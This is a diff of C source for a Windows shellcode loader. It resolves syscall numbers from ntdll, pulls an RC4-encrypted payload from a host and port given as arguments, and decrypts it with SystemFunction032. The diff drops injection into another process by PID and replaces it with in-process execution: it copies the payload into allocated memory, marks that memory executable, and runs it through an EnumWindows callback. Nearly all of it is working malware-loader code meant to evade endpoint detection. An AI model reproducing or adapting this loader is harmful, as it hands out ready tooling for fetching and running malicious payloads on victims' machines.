@@ -7,9 +7,8 @@
 
 #pragma comment(lib, "Ws2_32.lib")
 
-#ifdef _DEBUG
-#define pid 13400
-#endif
+//#define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
+#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )
 
 size_t szCalc;
 size_t szKey;
@@ -25,7 +24,6 @@ WORD GetSSN(HMODULE hNTDLL, char* Procedure) {
 	if (*((PBYTE)addr) == 0x4c && *((PBYTE)addr + 1) == 0x8b && *((PBYTE)addr + 2) == 0xd1 && *((PBYTE)addr + 3) == 0xb8 && *((PBYTE)addr + 6) == 0x00 && *((PBYTE)addr + 7) == 0x00) {
 		BYTE high = *((PBYTE)addr + 4);
 		BYTE low = *((PBYTE)addr + 5);
-		WORD sCALL = (high << 8) | low;
 		return high;
 	}
 
@@ -35,7 +33,6 @@ WORD GetSSN(HMODULE hNTDLL, char* Procedure) {
 			if (*((PBYTE)newADDR) == 0x4c && *((PBYTE)newADDR + 1) == 0x8b && *((PBYTE)newADDR + 2) == 0xd1 && *((PBYTE)newADDR + 3) == 0xb8 && *((PBYTE)newADDR + 6) == 0x00 && *((PBYTE)newADDR + 7) == 0x00) {
 				BYTE high = *((PBYTE)newADDR + 5);
 				BYTE low = *((PBYTE)newADDR + 4);
-				WORD sCALL = (high << 8) | low + i;
 				return high;
 			}
 		}
@@ -47,7 +44,6 @@ WORD GetSSN(HMODULE hNTDLL, char* Procedure) {
 			if (*((PBYTE)newADDR) == 0x4c && *((PBYTE)newADDR + 1) == 0x8b && *((PBYTE)newADDR + 2) == 0xd1 && *((PBYTE)newADDR + 3) == 0xb8 && *((PBYTE)newADDR + 6) == 0x00 && *((PBYTE)newADDR + 7) == 0x00) {
 				BYTE high = *((PBYTE)newADDR + 5);
 				BYTE low = *((PBYTE)newADDR + 4);
-				WORD sCALL = (high << 8) | low - i;
 				return high;
 			}
 		}
@@ -58,7 +54,6 @@ WORD GetSSN(HMODULE hNTDLL, char* Procedure) {
 }
 
 QWORD GetSyscallAdr(HMODULE hNTDLL, char* Procedure) {
-	DWORD FunctionSSN = 0;
 	UINT_PTR addr = 0;
 
 	addr = (UINT_PTR)GetProcAddress(hNTDLL, Procedure);
@@ -95,19 +90,13 @@ QWORD GetSyscallAdr(HMODULE hNTDLL, char* Procedure) {
 void Populate() {
 	HANDLE hNtdll = GetModuleHandleW(L"ntdll");
 
-	NtOpenProcessSSN = GetSSN(hNtdll, "NtOpenProcess");
 	NtAllocateVirtualMemoryExSSN = GetSSN(hNtdll, "NtAllocateVirtualMemoryEx");
 	NtProtectVirtualMemorySSN = GetSSN(hNtdll, "NtProtectVirtualMemory");
-	NtWriteVirtualMemorySSN = GetSSN(hNtdll, "NtWriteVirtualMemory");
-	NtCreateThreadExSSN = GetSSN(hNtdll, "NtCreateThreadEx");
-	NtCloseSSN = GetSSN(hNtdll, "NtClose");
 
-	NtOpenProcessSyscall = GetSyscallAdr(hNtdll, "NtOpenProcess");
+
 	NtAllocateVirtualMemoryExSyscall = GetSyscallAdr(hNtdll, "NtAllocateVirtualMemoryEx");
 	NtProtectVirtualMemorySyscall = GetSyscallAdr(hNtdll, "NtProtectVirtualMemory");
-	NtWriteVirtualMemorySyscall = GetSyscallAdr(hNtdll, "NtWriteVirtualMemory");
-	NtCreateThreadExSyscall = GetSyscallAdr(hNtdll, "NtCreateThreadEx");
-	NtCloseSyscall = GetSyscallAdr(hNtdll, "NtClose");
+
 
 	jodRC4 = (SystemFunction032)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction032");
 }
@@ -238,51 +227,38 @@ void PopulateData(char* host, char* port, char* LocKey, char* LocCipher) {
 }
 
 int main(int argc, char* argv[]) {
-	int PID = 0;
 	char *host;
 	char *port;
 	char *LocKey;
 	char *LocCipher;
 
 
-	if (argc < 5) {
+	if (argc < 4) {
 #if _DEBUG
 		ok("Will have to pull from code ugh");
 		char* host = "127.0.0.1";
 		char* port = "8080";
 		char LocKey[] = "key.bin";
 		char LocCipher[] = "cipher.bin";
-		PID = pid;
 		PopulateData(host, port, LocKey, LocCipher);
 		Populate();
 #else
-		error("Provide the PID of the process to inject calc into, the host, the key and the cipher \n%s <PID> <HOST> <PORT> <key.bin> <cipher.bin>", argv[0]);
+		error("Provide the host, port, the key and the cipher \n%s <HOST> <PORT> <key.bin> <cipher.bin>", argv[0]);
 		return 1;
 #endif
 	}
 	else {
-		PID = atoi(argv[1]);
-		host = argv[2];
-		port = argv[3];
-		LocKey = argv[4];
-		LocCipher = argv[5];
+		host = argv[1];
+		port = argv[2];
+		LocKey = argv[3];
+		LocCipher = argv[4];
 		PopulateData(host, port, LocKey, LocCipher);
 		Populate();
 	}
 
-	OBJECT_ATTRIBUTES oa = { sizeof(oa),NULL };
-	CLIENTID cid = { NULL };
-	cid.UniqueProcess = (HANDLE)PID;
-	HANDLE hProcess = NULL;
+	HANDLE hProcess = NtCurrentProcess();
 
-	NTSTATUS ntError = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
-	if (hProcess == NULL && ntError != STATUS_SUCCESS) {
-		error("Could not get a handle on the process with PID %d.", PID);
-		yolo();
-	}
-	else {
-		ok("Got the handle to the process --> 0x%p", hProcess);
-	}
+	NTSTATUS ntError;
 
 	size_t sz = 128;
 	LPVOID rBuffer = NULL;
@@ -299,16 +275,7 @@ int main(int argc, char* argv[]) {
 	ustring shellBuff = { (DWORD)szCalc,(DWORD)szCalc, cipher.data };
 	jodRC4(&shellBuff, &Key);
 
-	ntError = NtWriteVirtualMemory(hProcess, rBuffer, (PVOID)cipher.data, szCalc, 0);
-	if (ntError != STATUS_SUCCESS) {
-		error("Could not write shellcode to process memory");
-		jodRC4(&shellBuff, &Key);
-		yolo();
-	}
-	else {
-		ok("Wrote shellcode to memory");
-		jodRC4(&shellBuff, &Key);
-	}
+	memcpy_s(rBuffer, sz, cipher.data, cipher.size);
 
 	ULONG old;
 	ntError = NtProtectVirtualMemory(hProcess, &rBuffer, &szCalc, PAGE_EXECUTE_READ, &old);
@@ -320,18 +287,9 @@ int main(int argc, char* argv[]) {
 		ok("Memory Protections changed");
 	}
 
-	HANDLE tHandle = NULL;
-	ntError = NtCreateThreadEx(&tHandle, THREAD_ALL_ACCESS, &oa, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);
-	if (ntError != STATUS_SUCCESS) {
-		error("Could not Start a Thread");
-		yolo();
-	}
-	else {
-		ok("Thread Started");
-	}
+	EnumWindows((WNDENUMPROC)rBuffer, 0); //Callback Function
 
 	info("Closing all handles");
-	NtClose(hProcess);
 
 	ok("Exiting :)");
 
